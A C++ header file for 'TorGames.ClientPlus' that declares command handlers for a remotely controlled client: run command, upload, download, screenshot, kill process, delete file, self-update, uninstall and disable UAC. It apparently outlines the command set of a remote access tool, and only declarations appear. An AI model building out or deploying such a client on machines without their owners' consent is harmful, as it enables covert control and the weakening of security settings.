// TorGames.ClientPlus - Command handlers
#pragma once

#include "common.h"
#include "protocol.h"

struct CommandResult {
    bool success;
    std::string result;
    bool shouldExit = false;  // If true, client should exit after sending response
};

namespace Commands {
    // Process incoming command
    CommandResult HandleCommand(CommandType type, const char* payload);

    // Individual command handlers
    CommandResult HandlePing(const char* payload);
    CommandResult HandleGetSystemInfo(const char* payload);
    CommandResult HandleGetProcessList(const char* payload);
    CommandResult HandleKillProcess(const char* payload);
    CommandResult HandleRunCommand(const char* payload);
    CommandResult HandleDownload(const char* payload);
    CommandResult HandleUpload(const char* payload);
    CommandResult HandleListDirectory(const char* payload);
    CommandResult HandleDeleteFile(const char* payload);
    CommandResult HandleGetLogs(const char* payload);
    CommandResult HandleShutdown(const char* payload);
    CommandResult HandleRestart(const char* payload);
    CommandResult HandleUninstall(const char* payload);
    CommandResult HandleUpdate(const char* payload);
    CommandResult HandleScreenshot(const char* payload);
    CommandResult HandleMessageBox(const char* payload);
    CommandResult HandleUpdateAvailable(const char* payload);
    CommandResult HandleDisableUac(const char* payload);
    CommandResult HandleListDrives(const char* payload);
}
